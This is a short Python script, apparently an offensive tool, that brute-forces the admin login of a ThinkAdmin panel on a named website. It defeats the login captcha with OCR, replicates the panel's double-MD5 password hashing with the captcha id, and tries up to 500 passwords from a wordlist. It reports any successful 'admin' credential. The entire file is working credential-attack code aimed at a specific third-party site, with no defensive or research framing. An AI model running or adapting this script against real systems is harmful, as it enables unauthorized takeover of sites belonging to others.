#!/usr/bin/env python3
"""ThinkAdmin sites - full login brute with pw_mega subset (captcha OCR + md5 chain)"""
import urllib.request, urllib.parse, re, http.cookiejar, hashlib, json, base64, subprocess, sys, time

UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "*/*"}
SITES = ["http://catugbio.com"]

def get_opener():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj)), cj

def fetch(op, url, timeout=10, data=None, referer=None):
    h = {**UA}
    if data: h["Content-Type"] = "application/x-www-form-urlencoded"
    if referer: h["Referer"] = referer
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(5000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, str(ex)

def ocr_img(img_bytes):
    b64 = base64.b64encode(img_bytes).decode()
    code = ("import ddddocr,base64; o=ddddocr.DdddOcr(show_ad=False); "
            "print(o.classification(base64.b64decode('%s')))" % b64)
    r = subprocess.run([sys.executable, "-c", code], capture_output=True, timeout=20, cwd="/tmp")
    return r.stdout.decode().strip()

def get_captcha(op, host):
    code, body = fetch(op, host + "/admin/login/captcha")
    try:
        j = json.loads(body)
        data = j["data"]
        return data["uniqid"], base64.b64decode(data["image"].split(",", 1)[1])
    except Exception:
        return None, None

# pw list: from file (pw_mega top 500)
PWS = [l.strip() for l in open("/tmp/ta_pws.txt") if l.strip()][:500]
print("pw list: %d" % len(PWS), flush=True)

for site in SITES:
    print("=== %s ===" % site, flush=True)
    op, cj = get_opener()
    code, body = fetch(op, site + "/admin/login.html")
    if code != 200 or "data-login-form" not in body:
        print("  not thinkadmin login (%s)" % code, flush=True)
        continue
    hit = False
    for pw in PWS:
        uniqid, img = get_captcha(op, site)
        if not uniqid:
            print("  captcha fail", flush=True)
            break
        verify = ocr_img(img)
        if not verify:
            continue
        enc_pw = hashlib.md5((hashlib.md5(pw.encode()).hexdigest() + uniqid).encode()).hexdigest()
        data = urllib.parse.urlencode({"username": "admin", "password": enc_pw,
                                       "verify": verify, "uniqid": uniqid})
        code, body = fetch(op, site + "/admin/login.html", data=data, referer=site + "/admin/login.html")
        if '"code":1' in body or "退出" in body:
            print("  !!! HIT admin/%s" % pw, flush=True)
            hit = True
            break
        if "验证码" in body and "失败" in body:
            pass  # ocr wrong, retry same pw
        time.sleep(0.5)
    if not hit:
        print("  no hit (%d pws)" % len(PWS), flush=True)
